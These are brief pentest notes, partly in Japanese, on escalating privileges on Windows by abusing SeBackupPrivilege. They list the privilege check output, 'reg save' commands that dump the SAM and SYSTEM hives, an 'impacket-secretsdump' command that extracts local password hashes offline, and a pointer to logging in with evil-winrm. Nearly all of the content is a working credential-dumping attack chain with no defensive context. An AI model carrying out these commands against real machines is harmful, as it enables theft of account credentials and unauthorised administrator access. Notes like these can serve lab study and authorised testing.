## Get
`whoami /priv`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
## summary
- **SeBackupPrivilege**
  - この権限は、システム バックアップを容易にするために設計されたもので、システムで保護されたファイルへのアクセスを可能にしながら、他の既存の権限をバイパス
## Escalation
#### ready
```
reg save hklm\sam sam
reg save hklm\system system
```
- download to local(Kali)

#### make hash
- option
  - -sam:samファイル指定
  - -system:systemファイル指定
  - local:localで実行する事を指定
```
impacket-secretsdump -sam sam -system system local
```
#### exec
- such as evil-winrm
